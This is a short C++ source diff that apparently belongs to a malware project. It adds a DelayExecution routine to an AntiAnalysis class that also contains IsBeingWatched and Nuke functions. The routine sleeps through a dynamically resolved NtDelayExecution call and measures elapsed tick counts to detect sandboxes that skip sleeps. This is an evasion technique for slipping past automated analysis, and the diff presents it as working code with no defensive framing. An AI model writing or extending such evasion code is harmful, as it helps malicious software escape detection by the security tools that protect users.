@@ -46,6 +46,35 @@ bool AntiAnalysis::IsBeingWatched(API::APIResolver& resolver)
     return false;
 }
 
+bool AntiAnalysis::DelayExecution(float fMins, API::APIResolver& resolver) {
+
+    // Mins to ms
+    DWORD               dwMS          = fMins * 60000;
+    LARGE_INTEGER       DelayInterval = { 0 };
+    long long           delay         = NULL;
+    NTSTATUS            status        = NULL;
+
+
+    API::API_ACCESS api = resolver.GetAPIAccess();
+
+    delay = dwMS * 10000;
+    DelayInterval.QuadPart = -delay;
+
+    DWORD T0 = GetTickCount64();
+
+    if ((status = api.func.pNtDelayExecution(FALSE, &DelayInterval)) != 0x00 && status != STATUS_TIMEOUT) 
+        return false;
+    
+
+    DWORD T1 = GetTickCount64();
+
+    if ((DWORD)(T1 - T0) < dwMS)
+        return false;
+
+    return true;
+}
+
+
 int AntiAnalysis::Nuke(API::APIResolver& resolver)
 {
     WCHAR                       szPath[MAX_PATH * 2] = { 0 };
